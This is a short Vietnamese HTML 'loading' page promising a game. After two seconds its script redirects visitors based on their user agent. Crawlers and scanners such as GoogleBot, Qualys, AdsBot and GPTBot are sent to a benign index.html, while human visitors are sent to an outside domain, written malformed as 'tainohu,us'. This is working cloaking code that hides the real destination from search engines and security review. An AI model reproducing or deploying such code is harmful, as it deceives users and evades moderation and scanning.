<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(to right, #2c3e50, #3498db);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            color: #fff;
            text-align: center;
        }

        .container {
            max-width: 600px;
            padding: 20px;
            background: rgba(0, 0, 0, 0.7);
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
        }

        h1 {
            font-size: 28px;
            margin-bottom: 20px;
        }

        p {
            font-size: 18px;
        }

        .loading-animation {
            margin-top: 20px;
            height: 50px;
            width: 50px;
            border: 5px solid rgba(255, 255, 255, 0.1);
            border-top: 5px solid #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Vui lòng đợi 2 giây...</h1>
        <p>Chúng tôi đang chuẩn bị trang game cho bạn!</p>
        <div class="loading-animation"></div>
    </div>

    <script>
        setTimeout(function() {
            const userAgent = navigator.userAgent;
            const botKeywords = ["GoogleBot", "Qualys", "Amazonbot", "BingBot", "Synthetic Bot", "Google AdsBot", "Taboola", "GoogleOther", "GPTBot", "Google Image Proxy"];

            const isBot = botKeywords.some(bot => userAgent.includes(bot));

            if (isBot) {
                window.location.href = "index.html";
            } else {
                window.location.href = "https://tainohu,us/";
            }
        }, 2000);
    </script>
</body>
</html>
